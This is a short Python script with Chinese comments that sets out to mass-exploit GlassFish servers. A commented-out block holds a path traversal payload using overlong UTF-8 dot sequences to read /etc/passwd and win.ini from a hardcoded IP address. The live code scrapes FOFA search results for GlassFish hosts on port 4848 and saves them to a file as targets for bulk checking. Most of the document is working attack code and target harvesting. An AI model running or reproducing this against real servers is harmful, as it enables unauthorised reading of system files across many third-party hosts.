import requests,base64
from lxml import etree
'''
url="http://34.87.47.158:4848/"
payload_linux= '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
payload_win='/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'

# data_linux = requests.get(url+payload_linux)
# data_win = requests.get(url+payload_win)
data_linux = requests.get(url+payload_linux).status_code
data_win = requests.get(url+payload_win).status_code
# print(data_linux.content.decode('utf-8'))
# print('-----------------------------------------------------------')
# print(data_win.content.decode('utf-8'))
print(data_linux)
print('-----------------------------------------------------------')
print(data_win)
'''
'''
    如何实现漏洞的批量化
    1.获取可能存在漏洞的地址信息--借助FOFA进行获取目标
        1.1将请求的数据进行筛选
    2.批量请求地址信息进行判断是否存在-单线程和多线程
'''
search_data='"glassfish"&&port="4848"'
search_data_bs = str(base64.b64encode(search_data.encode('utf-8')),"utf-8")
print(search_data_bs)
url='https://fofa.so/result?qbase64=' #+"page"=+页数  页数用for循环，登录加上cookie头
urls=url+search_data_bs
result = requests.get(urls).content
# print(result.decode('utf-8'))
soup = etree.HTML(result)
ip_data=soup.xpath('//span[@class="aSpan"]/a[@target="_blank"]/@href')
ip_data='\n'.join(ip_data)
with open(r'ip.txt','a+') as f:
    f.write(ip_data+'\n')
    f.close()
# print(ip_data)